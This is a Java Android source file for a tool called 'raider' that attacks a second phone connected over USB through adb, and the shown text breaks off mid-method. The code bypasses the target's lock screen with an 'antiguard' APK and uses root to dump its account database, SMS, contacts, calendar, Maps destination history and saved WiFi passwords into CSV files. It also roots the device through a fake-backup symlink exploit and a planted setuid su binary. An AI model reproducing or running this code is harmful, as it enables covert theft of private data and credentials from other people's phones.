package com.silentservices.raider;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Color;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;

public class RaiderActivity extends Activity {

	Boolean bADBRunning = false;

	EditText etInput;
	EditText etCommand;
	Button btnStartADB;

	Button btnCheckDevices;

	Button btnEnter;

	Button btnGetData;
	Button btnGetDataRoot;
	Button btnGetGoogleData;
	Button btnGetPics;
	Button btnADBRoot;
	Button btnAutoRaid;
	Button btnClearOutput;
	Button btnListPackages;
	Button btnUnlockTarget;
	Button btnGetAccounts;
	Button btnGetSms;
	Button btnGetCalendar;
	Button btnGetContacts;
	Button btnGetMapsData;
	Button btnGetWifi;

	Button btnLockTarget;
	Button btnRootTarget;
	ImageView ivADBEnabled;
	ProgressBar pbProgress;
	Process mainprocess;
	BufferedReader mainstdInput;
	BufferedReader mainstdError;
	ProgressDialog progressDialog;
	UsbDevice uDevice;
	UsbManager uManager;
	BroadcastReceiver mUsbReceiver;
	String strDevice = "";
	TextView tvTarget;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		setContentView(R.layout.main);
		btnStartADB = (Button) findViewById(R.id.button1);
		btnStartADB.setOnClickListener(btnStartADBpressed);
		btnCheckDevices = (Button) findViewById(R.id.button2);
		btnCheckDevices.setOnClickListener(btnCheckDevicespressed);
		btnEnter = (Button) findViewById(R.id.button3);
		btnEnter.setOnClickListener(btnEnterpressed);

		btnGetData = (Button) findViewById(R.id.button4);
		btnGetData.setOnClickListener(btnGetDatapressed);
		btnGetDataRoot = (Button) findViewById(R.id.button5);
		btnGetDataRoot.setOnClickListener(btnGetDataRootpressed);
		btnGetGoogleData = (Button) findViewById(R.id.button6);
		btnGetGoogleData.setOnClickListener(btnGetGoogleDatapressed);
		btnGetPics = (Button) findViewById(R.id.button7);
		btnGetPics.setOnClickListener(btnGetPicspressed);
		btnADBRoot = (Button) findViewById(R.id.button8);
		btnADBRoot.setOnClickListener(btnADBRootpressed);
		btnAutoRaid = (Button) findViewById(R.id.button9);
		btnAutoRaid.setOnClickListener(btnAutoRaidpressed);
		btnClearOutput = (Button) findViewById(R.id.button10);
		btnClearOutput.setOnClickListener(btnClearOutputpressed);
		btnListPackages = (Button) findViewById(R.id.btnListPackages);
		btnListPackages.setOnClickListener(btnListPackagespressed);
		btnUnlockTarget = (Button) findViewById(R.id.btnUnlockTarget);
		btnUnlockTarget.setOnClickListener(btnUnlockTargetpressed);
		btnGetAccounts = (Button) findViewById(R.id.btnGetAccounts);
		btnGetAccounts.setOnClickListener(btnGetAccountspressed);

		btnGetSms = (Button) findViewById(R.id.btnGetSms);
		btnGetSms.setOnClickListener(btnGetSmspressed);
		btnGetCalendar = (Button) findViewById(R.id.btnGetCalendar);
		btnGetCalendar.setOnClickListener(btnGetCalendarpressed);
		btnGetContacts = (Button) findViewById(R.id.btnGetContacts);
		btnGetContacts.setOnClickListener(btnGetContactspressed);
		btnGetMapsData = (Button) findViewById(R.id.btnGetMapsData);
		btnGetMapsData.setOnClickListener(btnGetMapsDatapressed);
		btnGetWifi = (Button) findViewById(R.id.btnGetWifi);
		btnGetWifi.setOnClickListener(btnGetWifipressed);

		btnLockTarget = (Button) findViewById(R.id.btnLockTarget);
		btnLockTarget.setOnClickListener(btnLockTargetpressed);
		btnRootTarget = (Button) findViewById(R.id.btnRootTarget);
		btnRootTarget.setOnClickListener(btnRootTargetpressed);
		etInput = (EditText) findViewById(R.id.editText1);
		etCommand = (EditText) findViewById(R.id.editText2);
		ivADBEnabled = (ImageView) findViewById(R.id.imageView1);
		tvTarget = (TextView) findViewById(R.id.tvTarget);

		btnGetData.setEnabled(false);
		btnGetDataRoot.setEnabled(false);
		btnGetGoogleData.setEnabled(false);
		btnGetPics.setEnabled(false);
		btnADBRoot.setEnabled(false);
		btnAutoRaid.setEnabled(false);
		btnClearOutput.setEnabled(false);
		btnListPackages.setEnabled(false);
		btnUnlockTarget.setEnabled(false);
		btnGetAccounts.setEnabled(false);
		btnLockTarget.setEnabled(false);
		btnRootTarget.setEnabled(false);
		btnGetSms.setEnabled(false);
		btnGetCalendar.setEnabled(false);
		btnGetContacts.setEnabled(false);
		btnGetMapsData.setEnabled(false);
		btnGetWifi.setEnabled(false);
		btnGetData.setTextColor(Color.GRAY);
		btnGetDataRoot.setTextColor(Color.GRAY);
		btnGetGoogleData.setTextColor(Color.GRAY);
		btnGetPics.setTextColor(Color.GRAY);
		btnADBRoot.setTextColor(Color.GRAY);
		btnAutoRaid.setTextColor(Color.GRAY);
		btnClearOutput.setTextColor(Color.GRAY);
		btnListPackages.setTextColor(Color.GRAY);
		btnUnlockTarget.setTextColor(Color.GRAY);
		btnGetAccounts.setTextColor(Color.GRAY);
		btnLockTarget.setTextColor(Color.GRAY);
		btnRootTarget.setTextColor(Color.GRAY);
		btnGetSms.setTextColor(Color.GRAY);
		btnGetCalendar.setTextColor(Color.GRAY);
		btnGetContacts.setTextColor(Color.GRAY);
		btnGetMapsData.setTextColor(Color.GRAY);
		btnGetWifi.setTextColor(Color.GRAY);

		doCheckIfAdbIsAvailable();

		doExtractFiles("antiguard.apk");
		doExtractFiles("fakebackup.ab");
		doExtractFiles("sqlite3");
		doRegisterReceivers();
		doInitializeShellProcess();
		new doStartADB().execute();
		doCheckIfADBIsRunning();
		doReadUsbDeviceDetails();

	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		if (mUsbReceiver != null) {
			unregisterReceiver(mUsbReceiver);
		}
	}

	@Override
	protected void onResume() {
		super.onResume();
		if (mUsbReceiver == null) {
			doRegisterReceivers();
		}
	}

	@Override
	protected void onPause() {
		super.onPause();
		if (mUsbReceiver != null) {
			unregisterReceiver(mUsbReceiver);
			mUsbReceiver = null;
		}
	}

	public void doRegisterReceivers() {

		IntentFilter filter = new IntentFilter();

		filter.addAction(UsbManager.ACTION_USB_DEVICE_ATTACHED);
		// filter.addAction(UsbManager.ACTION_USB_DEVICE_DETACHED);

		// BroadcastReceiver when device added or removed
		mUsbReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				String action = intent.getAction();
				if (UsbManager.ACTION_USB_DEVICE_ATTACHED.equals(action)) {
					doReadUsbDeviceDetails();
				}
			}
		};
		registerReceiver(mUsbReceiver, filter);
	}

	private void doCheckIfAdbIsAvailable() {
		File file = new File("/system/bin/", "adb");

		if (!file.exists()) {
			file = new File("/system/xbin/", "adb");
			if (!file.exists()) {

				doShowResultAlertBox(
						"Sorry",
						"ADB could not be found. Make sure it's available in /system/bin or /system/xbin. I will quit now.");

			}
		}
	}

	private void doCheckIfSqlite3IsAvailable() {
		File file = new File("/system/bin/", "sqlite3");

		if (!file.exists()) {
			file = new File("/system/xbin/", "sqlite3");
			if (!file.exists()) {

				doShowResultAlertBox(
						"Sorry",
						"sqlite3 could not be found. Make sure it's available in /system/bin or /system/xbin. I will quit now.");

			}
		}
	}

	private void doReadUsbDeviceDetails() {

		uManager = (UsbManager) getSystemService(USB_SERVICE);
		uDevice = (UsbDevice) getIntent().getParcelableExtra(
				UsbManager.EXTRA_DEVICE);
		if (uDevice != null) {
			etInput.append("Model: " + uDevice.getDeviceName().toString());
			etInput.append("ID: " + String.valueOf(uDevice.getDeviceId()));
			etInput.append("Class: " + String.valueOf(uDevice.getDeviceClass()));
			etInput.append("Subclass: "
					+ String.valueOf(uDevice.getDeviceSubclass()));
			etInput.append("Protocol: "
					+ String.valueOf(uDevice.getDeviceProtocol()));
			etInput.append("Vendor: " + String.valueOf(uDevice.getVendorId()));
			etInput.append("Product: " + String.valueOf(uDevice.getProductId()));

		}

	}

	private void doInitializeShellProcess() {

		try {
			mainprocess = Runtime.getRuntime().exec("su");
			mainstdInput = new BufferedReader(new InputStreamReader(
					mainprocess.getInputStream()));
			mainstdError = new BufferedReader(new InputStreamReader(
					mainprocess.getErrorStream()));

		} catch (IOException e) {

			etInput.append("exception happened - here's what I know: ");

			etInput.append(e.toString());

		}
		;

	}

	public void doExtractFiles(String fileName) {
		if (!new File(fileName).exists()) {

			try {
				InputStream localInputStream = getAssets().open(fileName);
				FileOutputStream localFileOutputStream = getBaseContext()
						.openFileOutput(fileName, MODE_PRIVATE);

				byte[] arrayOfByte = new byte[1024];
				int offset;
				while ((offset = localInputStream.read(arrayOfByte)) > 0) {
					localFileOutputStream.write(arrayOfByte, 0, offset);
				}
				localFileOutputStream.close();
				localInputStream.close();

				etInput.append("Info: File " + fileName
						+ " extracted successfully. \r\n");
			} catch (IOException localIOException) {
				localIOException.printStackTrace();
				return;
			}
		} else
			etInput.append("Info: files already extracted.\r\n");
	}

	public void doPushSqlite() {
		PackageManager m = getPackageManager();
		String s = getPackageName();
		try {
			PackageInfo p = m.getPackageInfo(s, 0);
			s = p.applicationInfo.dataDir;
			try {

				if (!doCheckFiles("/system/bin/sqlite3")
						&& !doCheckFiles("/system/xbin/sqlite3")) {
					etInput.append("sqlite3 is not found on device. I will try to push it over...\r\n");
					doInitializeShellProcess();
					StringBuilder sb = new StringBuilder();
					DataOutputStream os = new DataOutputStream(
							mainprocess.getOutputStream());
					os.writeBytes("adb  -d -s " + strDevice + " push " + s
							+ "/files/sqlite3 /sdcard/\n");
					doMountTargetSystemRW();

					os.writeBytes("adb -d -s "
							+ strDevice
							+ " shell su -c \"cp /sdcard/sqlite3 /system/bin/\"\n");
					os.writeBytes("adb -d -s "
							+ strDevice
							+ " shell su -c \"chmod 755 /system/bin/sqlite3\"\n");
					os.writeBytes("exit\n");
					os.flush();

					while ((s = mainstdInput.readLine()) != null) {

						sb.append(s + "\r\n");

						try {

							etInput.append(sb);

						} catch (Exception ex) {
							progressDialog.dismiss();
						}
					}
					progressDialog.dismiss();

					// read any errors from the attempted command

					while ((s = mainstdError.readLine()) != null) {

						etInput.append(s.toString());
						etInput.append("\r\n");
					}

				} else {
					etInput.append("sqlite3 is already installed on target...\r\n");
				}

			} catch (IOException e) {

				etInput.append("exception happened - here's what I know: ");

				etInput.append(e.toString());

			}
			;

		} catch (NameNotFoundException e) {
			etInput.append("Info: Package name not found.\r\n");
		}

	}

	public void doMountTargetSystemRW() {
		PackageManager m = getPackageManager();
		String s = getPackageName();
		try {
			PackageInfo p = m.getPackageInfo(s, 0);
			s = p.applicationInfo.dataDir;
			try {

				doInitializeShellProcess();
				StringBuilder sb = new StringBuilder();
				DataOutputStream os = new DataOutputStream(
						mainprocess.getOutputStream());

				os.writeBytes("adb -d -s " + strDevice
						+ " shell su -c \"mount -o remount,rw /system\"\n");
				os.writeBytes("exit\n");
				os.flush();

				while ((s = mainstdInput.readLine()) != null) {

					sb.append(s + "\r\n");

					try {

						etInput.append(sb);

					} catch (Exception ex) {
						progressDialog.dismiss();
					}
				}
				progressDialog.dismiss();

				// read any errors from the attempted command

				while ((s = mainstdError.readLine()) != null) {

					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {

				etInput.append("exception happened - here's what I know: ");

				etInput.append(e.toString());

			}
			;

		} catch (NameNotFoundException e) {
			etInput.append("Info: Package name not found.\r\n");
		}

	}

	public void doUnlockTarget() {
		PackageManager m = getPackageManager();
		String s = getPackageName();
		try {
			PackageInfo p = m.getPackageInfo(s, 0);
			s = p.applicationInfo.dataDir;
			try {

				doInitializeShellProcess();
				StringBuilder sb = new StringBuilder();
				DataOutputStream os = new DataOutputStream(
						mainprocess.getOutputStream());
				os.writeBytes("adb  -d -s " + strDevice + " install " + s
						+ "/files/antiguard.apk\n");
				os.writeBytes("adb -d -s " + strDevice
						+ " shell am start io.kos.antiguard/.unlock\n");
				os.writeBytes("exit\n");
				os.flush();

				while ((s = mainstdInput.readLine()) != null) {

					sb.append(s + "\r\n");

					try {

						etInput.append(sb);

					} catch (Exception ex) {
						progressDialog.dismiss();
					}
				}
				progressDialog.dismiss();

				// read any errors from the attempted command

				while ((s = mainstdError.readLine()) != null) {

					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {

				etInput.append("exception happened - here's what I know: ");

				etInput.append(e.toString());

			}
			;

		} catch (NameNotFoundException e) {
			etInput.append("Info: Package name not found.\r\n");
		}

	}

	public void doLockTarget() {

		String s = "";

		try {

			doInitializeShellProcess();
			StringBuilder sb = new StringBuilder();
			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());

			os.writeBytes("adb -d -s " + strDevice
					+ " uninstall io.kos.antiguard\n");
			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				sb.append(s + "\r\n");

				try {

					etInput.append(sb);

				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}
			progressDialog.dismiss();

			// read any errors from the attempted command

			while ((s = mainstdError.readLine()) != null) {

				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {

			etInput.append("exception happened - here's what I know: ");

			etInput.append(e.toString());

		}
		;

	}

	public void doWaitForDevice() {

		String s = null;
		try {

			/* start adb as root */

			doInitializeShellProcess();
			StringBuilder sb = new StringBuilder();
			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			os.writeBytes("adb wait-for-device\n");
			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				sb.append(s + "\r\n");

				try {

					etInput.append(sb);

				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}
			progressDialog.dismiss();

			// read any errors from the attempted command

			while ((s = mainstdError.readLine()) != null) {

				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {

			etInput.append("exception happened - here's what I know: ");

			etInput.append(e.toString());

		}
		;

	}

	public boolean doCheckDirs(String dir) {

		String s = null;
		try {

			/* Check if dirs exist */

			Process p = Runtime.getRuntime().exec("su");
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(
					p.getInputStream()));
			BufferedReader stdError = new BufferedReader(new InputStreamReader(
					p.getErrorStream()));
			StringBuilder sb = new StringBuilder();
			DataOutputStream os = new DataOutputStream(p.getOutputStream());
			os.writeBytes("adb -d -s " + strDevice + " shell \"[[ -d " + dir
					+ " ]] && echo 1\"\n");
			os.writeBytes("exit\n");
			os.flush();

			while ((s = stdInput.readLine()) != null) {

				if (s.contentEquals("1")) {
					progressDialog.dismiss();
					sb.append(s + "\r\n" + dir + " is present\r\n");
					return true;

				} else {
					progressDialog.dismiss();
					sb.append(s + "\r\n" + dir + " is NOT present\r\n");
				}

				try {

					etInput.append(sb);

				} catch (Exception ex) {

				}
			}

			// read any errors from the attempted command

			while ((s = stdError.readLine()) != null) {

				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {

			etInput.append("exception happened - here's what I know: ");

			etInput.append(e.toString());

		}
		;

		return false;

	}

	public boolean doCheckFiles(String file) {

		String s = null;
		try {

			/* Check if dirs exist */

			Process p = Runtime.getRuntime().exec("su");
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(
					p.getInputStream()));
			BufferedReader stdError = new BufferedReader(new InputStreamReader(
					p.getErrorStream()));
			StringBuilder sb = new StringBuilder();
			DataOutputStream os = new DataOutputStream(p.getOutputStream());
			os.writeBytes("adb -d -s " + strDevice + " shell \"[[ -f " + file
					+ " ]] && echo 1\"\n");
			os.writeBytes("exit\n");
			os.flush();

			while ((s = stdInput.readLine()) != null) {

				if (s.contentEquals("1")) {
					progressDialog.dismiss();
					sb.append(s + "\r\n" + file + " is present\r\n");
					return true;

				} else {
					progressDialog.dismiss();
					sb.append(s + "\r\n" + file + " is NOT present\r\n");
				}

				try {

					etInput.append(sb);

				} catch (Exception ex) {

				}
			}

			// read any errors from the attempted command

			while ((s = stdError.readLine()) != null) {

				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {

			etInput.append("exception happened - here's what I know: ");

			etInput.append(e.toString());

		}
		;

		return false;

	}

	public void doGetPackages() {

		String s = null;
		try {

			/* run the Unix "adb shell pm list packages" command */
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Reading installed packages", " Please wait ... ", true);

			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			os.writeBytes("adb -d -s " + strDevice
					+ "  shell pm list packages\n");
			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				s = s + "\n";
				try {
					doWriteToFile("raider-contacts-" + strDevice, s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
				try {
					etInput.append(s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}

			while ((s = mainstdError.readLine()) != null) {
				progressDialog.dismiss();
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			progressDialog.dismiss();
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

		progressDialog.dismiss();
	}

	public void doReadAccounts() {
		doReadSms();
		String s = null;
		try {

			/* run the Unix "adb shell sqlite3" command */
			doPushSqlite();
			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			if (doCheckDirs("/data/system/users/0/")) {

				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell su -c \"sqlite3 /data/system/users/0/accounts.db 'select * from accounts'\"\n");

			} else {
				etInput.append("Trying to read accounts. This may take a while. Please be patient...\r\n");

				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell su -c \"sqlite3 /data/system/accounts.db 'select * from accounts'\"\n");

			}

			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				s = s + "\n";
				try {
					doWriteToFile("raider-accounts-" + strDevice, s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
				try {
					etInput.append(s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}

			while ((s = mainstdError.readLine()) != null) {
				progressDialog.dismiss();
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			progressDialog.dismiss();
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

		progressDialog.dismiss();
	}

	public void doReadSms() {

		String s = null;
		try {

			/* run the Unix "adb shell sqlite3" command */
			doPushSqlite();
			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			if (doCheckDirs("/data/data/com.android.providers.telephony/databases/")) {

				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell su -c \"sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db 'select * from sms'\"\n");

			} else {
				etInput.append("Sorry, no SMS DB found. Maybe the target uses a custom SMS app?");
			}

			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				s = s + "\n";
				try {
					doWriteToFile("raider-sms-" + strDevice, s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
				try {
					String[] strTmp = s.split("\\|");

					for (int i = 0; i < strTmp.length; i++) {

						if (!(strTmp[i].length() <= 1)) {
							etInput.append(strTmp[i] + " | ");

						}

					}
					etInput.append("\r\n\r\n");
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}

			while ((s = mainstdError.readLine()) != null) {
				progressDialog.dismiss();
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			progressDialog.dismiss();
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

		progressDialog.dismiss();
	}

	public void doReadCalendar() {

		String s = null;
		try {

			/* run the Unix "adb shell sqlite3" command */
			doPushSqlite();
			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			if (doCheckDirs("/data/data/com.android.providers.telephony/databases/")) {

				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell su -c \"sqlite3 /data/data/com.android.providers.calendar/databases/calendar.db 'select * from Events'\"\n");

			} else {
				etInput.append("Sorry, no calendar events found...");
			}

			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				s = s + "\n";
				try {
					doWriteToFile("raider-calendar-" + strDevice, s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
				try {
					String[] strTmp = s.split("\\|");

					for (int i = 0; i < strTmp.length; i++) {

						if (!(strTmp[i].length() <= 1)) {
							etInput.append(strTmp[i] + " | ");

						}

					}
					etInput.append("\r\n\r\n");
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}

			while ((s = mainstdError.readLine()) != null) {
				progressDialog.dismiss();
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			progressDialog.dismiss();
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

		progressDialog.dismiss();
	}

	public void doReadContacts() {

		String s = null;
		try {

			/* run the Unix "adb shell sqlite3" command */
			doPushSqlite();
			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			if (doCheckDirs("/data/data/com.android.providers.telephony/databases/")) {

				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell su -c \"sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db 'select * from data'\"\n");

			} else {
				etInput.append("Sorry, no contacts found...");
			}

			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				s = s + "\n";
				try {
					doWriteToFile("raider-contacts-" + strDevice, s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
				try {
					String[] strTmp = s.split("\\|");

					for (int i = 0; i < strTmp.length; i++) {

						if (!(strTmp[i].length() <= 1)) {
							etInput.append(strTmp[i] + " | ");

						}

					}
					etInput.append("\r\n\r\n");
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}

			while ((s = mainstdError.readLine()) != null) {
				progressDialog.dismiss();
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			progressDialog.dismiss();
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

		progressDialog.dismiss();
	}

	public void doReadMapsData() {

		String s = null;
		try {

			/* run the Unix "adb shell sqlite3" command */
			doPushSqlite();
			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			if (doCheckDirs("/data/data/com.google.android.apps.maps/databases/")) {

				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell su -c \"sqlite3 /data/data/com.google.android.apps.maps/databases/da_destination_history 'select * from destination_history'\"\n");

			} else {
				etInput.append("Sorry, no Google Maps Data found...");
			}

			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				s = s + "\n";
				try {
					doWriteToFile("raider-destinations-" + strDevice, s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
				try {
					String[] strTmp = s.split("\\|");

					String timeStamp = strTmp[0];
					java.util.Date time = new java.util.Date(
							Long.parseLong(timeStamp) * 1000);
					strTmp[0] = time.toString();
					for (int i = 0; i < strTmp.length; i++) {

						if (!(strTmp[i].length() <= 1)) {
							etInput.append(strTmp[i] + " | ");

						}

					}
					etInput.append("\r\n\r\n");
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}

			while ((s = mainstdError.readLine()) != null) {
				progressDialog.dismiss();
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			progressDialog.dismiss();
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

		progressDialog.dismiss();
	}

	public void doReadWifi() {

		String s = null;
		try {

			/* run the Unix "adb shell sqlite3" command */

			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			if (doCheckDirs("/data/misc/wifi/")) {

				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell su -c \"cat /data/misc/wifi/wpa_supplicant.conf\"\n");

			} else {
				etInput.append("Sorry, no WiFi data found...");
			}

			os.writeBytes("exit\n");
			os.flush();

			while ((s = mainstdInput.readLine()) != null) {

				s = s + "\n";
				try {
					doWriteToFile("raider-wifi-" + strDevice, s);
				} catch (Exception ex) {
					progressDialog.dismiss();
				}
				try {
					String[] strTmp = s.split("\\=");

					if (strTmp[0].contains("ssid")) {
						etInput.append("--------------------\n");
						etInput.append("SSID: " + strTmp[1] + "\n");

					} else if (strTmp[0].contains("psk")) {
						etInput.append("Password: " + strTmp[1] + "\n");

					} else if (strTmp[0].contains("key_mgmt")) {
						etInput.append("Security: " + strTmp[1] + "\n");
						etInput.append("--------------------\n");
					}

				} catch (Exception ex) {
					progressDialog.dismiss();
				}
			}
			etInput.append("\r\n\r\n");
			while ((s = mainstdError.readLine()) != null) {
				progressDialog.dismiss();
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			progressDialog.dismiss();
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

		progressDialog.dismiss();
	}

	public void doRootTarget() {
		PackageManager m = getPackageManager();
		String s = getPackageName();
		try {
			PackageInfo p = m.getPackageInfo(s, 0);
			s = p.applicationInfo.dataDir;

			try {

				/* run the Unix "adb shell sqlite3" command */

				doInitializeShellProcess();

				DataOutputStream os = new DataOutputStream(
						mainprocess.getOutputStream());

				os.writeBytes("adb -d -s " + strDevice + " restore " + s
						+ "/files/fakebackup.ab");
				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell \"while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';\"");
				os.writeBytes("adb -d -s " + strDevice + " reboot");
				os.writeBytes("adb wait-for-device");
				os.writeBytes("adb -d -s " + strDevice
						+ " shell \"mount -o rw,remount /system\"");
				os.writeBytes("adb -d -s " + strDevice
						+ " push includes/su-static /system/xbin/su");
				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell \"/data/local/tmp/busybox chown 0:0 /system/xbin/su\"");
				os.writeBytes("adb -d -s "
						+ strDevice
						+ " shell \"/data/local/tmp/busybox chmod 6777 /system/xbin/su\"");
				os.writeBytes("adb -d -s " + strDevice
						+ " push includes/Superuser.apk /system/app/");
				os.writeBytes("adb -d -s " + strDevice
						+ " shell \"rm /data/local.prop\"");
				os.writeBytes("adb -d -s " + strDevice + " reboot");
				os.writeBytes("exit\n");
				os.flush();

				while ((s = mainstdInput.readLine()) != null) {

					s = s + "\n";
					try {
						etInput.append(s);
					} catch (Exception ex) {

					}
				}

				while ((s = mainstdError.readLine()) != null) {

					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {

				etInput.append("exception happened - here's what I know: ");
				etInput.append(e.toString());
			}
			;
		} catch (NameNotFoundException e) {
			etInput.append("Info: Package name not found.\r\n");
		}

	}

	protected void doWriteToFile(String filename, final String text) {

		File strPath = Environment.getExternalStorageDirectory();
		final File fExportFile = new File(
				Environment.getExternalStorageDirectory() + "/" + filename
						+ ".csv");
		if (!fExportFile.exists()) {
			try {
				fExportFile.createNewFile();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		try {

			BufferedWriter buf = new BufferedWriter(new FileWriter(fExportFile,
					true));
			buf.append(text);
			buf.newLine();
			buf.close();

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public void doCheckIfADBIsRunning() {

		String s = null;
		try {

			/* run the Unix "adb devices" command */

			doInitializeShellProcess();

			DataOutputStream os = new DataOutputStream(
					mainprocess.getOutputStream());
			os.writeBytes("ps | grep \" adb\"\n");
			os.writeBytes("exit\n");
			os.flush();

			if ((s = mainstdInput.readLine()) != null) {

				bADBRunning = true;
				ivADBEnabled.setImageResource(R.drawable.green);

			} else {
				bADBRunning = false;
				ivADBEnabled.setImageResource(R.drawable.red);
			}

			while ((s = mainstdError.readLine()) != null) {
				etInput.append(s.toString());
				etInput.append("\r\n");
			}

		} catch (IOException e) {
			etInput.append("exception happened - here's what I know: ");
			etInput.append(e.toString());
		}
		;

	}

	protected void doShowResultAlertBox(String title, String mymessage) {

		new AlertDialog.Builder(this)

				.setMessage(mymessage)
				.setTitle(title)
				.setCancelable(true)
				.setPositiveButton(android.R.string.ok,
						new DialogInterface.OnClickListener() {
							@Override
							public void onClick(DialogInterface dialog,
									int whichButton) {
								RaiderActivity.this.finish();
							}
						}).show();
	}

	private final View.OnClickListener btnStartADBpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {

			new doStartADB().execute();
		}
	};

	private final View.OnClickListener btnCheckDevicespressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			String s = null;
			try {

				/* run the Unix "adb devices" command */

				doInitializeShellProcess();

				DataOutputStream os = new DataOutputStream(
						mainprocess.getOutputStream());
				os.writeBytes("adb devices\n");
				os.writeBytes("exit\n");
				os.flush();

				while ((s = mainstdInput.readLine()) != null) {

					s = s + "\n";
					try {
						etInput.append(s);
						if (!s.contains("emulator") && !s.contains("devices")
								&& s.contains("device")) {
							String[] strTmpDevice = s.split("\t");
							strDevice = strTmpDevice[0];
							tvTarget.setText("Current Target: " + strDevice);
							btnGetData.setEnabled(true);

							btnGetDataRoot.setEnabled(true);
